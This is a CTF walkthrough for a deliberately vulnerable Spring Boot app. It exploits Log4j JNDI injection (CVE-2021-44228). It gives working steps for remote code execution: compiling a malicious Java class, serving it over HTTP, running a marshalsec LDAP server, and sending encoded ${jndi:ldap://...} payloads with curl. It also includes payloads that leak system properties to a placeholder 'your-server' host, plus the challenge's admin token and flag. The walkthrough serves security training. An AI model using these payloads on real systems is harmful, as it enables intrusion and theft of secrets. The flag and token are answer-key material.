# SandwishPicnic CTF Challenge - Flag Extraction Guide

## Challenge Overview

This CTF challenge focuses on **Log4j JNDI Injection (CVE-2021-44228)**. Multiple flags are hidden throughout the application and can be extracted using different exploitation techniques.

**Setup:**
```bash
source setup-ctf-env.sh  # Set environment variables
mvn spring-boot:run      # Start vulnerable application
```

---

### ** Remote Code Execution** 
Achieve RCE and read flag file from filesystem.

**Setup RCE Environment:**
```bash
# Terminal 1: Compile exploit
javac Exploit.java -source 8 -target 8

# Terminal 2: HTTP server
python -m http.server 8000

# Terminal 3: LDAP server  
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8000/#Exploit 1389

# Terminal 4: Vulnerable app
mvn spring-boot:run
```

**Exploit:**
```bash
# Trigger RCE
curl "http://localhost:8080/login?username=%24%7Bjndi%3Aldap%3A%2F%2Flocalhost%3A1389%2FExploit%7D"

---

### **Level 5: Secret Admin Endpoint (PRV ESC)** 
Discover and access hidden admin endpoint.

**Steps:**
1. Extract admin password using system property lookup:
   ```bash
   curl "http://localhost:8080/login?username=\${jndi:ldap://your-server/\${sys:ctf.admin.password}}"
   ```

2. Extract secret endpoint location:
   ```bash
   curl "http://localhost:8080/search?query=\${jndi:ldap://your-server/\${sys:ctf.secret.endpoint}}"
   ```

3. Access admin endpoint with discovered credentials:
   ```bash
   curl "http://localhost:8080/admin/secret?token=admin_l0g4j_2021"
   ```

**Expected Flag:**
- `CTF{4dm1n_3ndp01nt_d1sc0v3r3d}`


## Required Tools

- **LDAP Server:** marshalsec JAR file
- **HTTP Server:** Python simple server or any web server
- **Exploit Class:** Java compiled malicious class
- **Payload Generator:** Custom or online Log4j payload generators

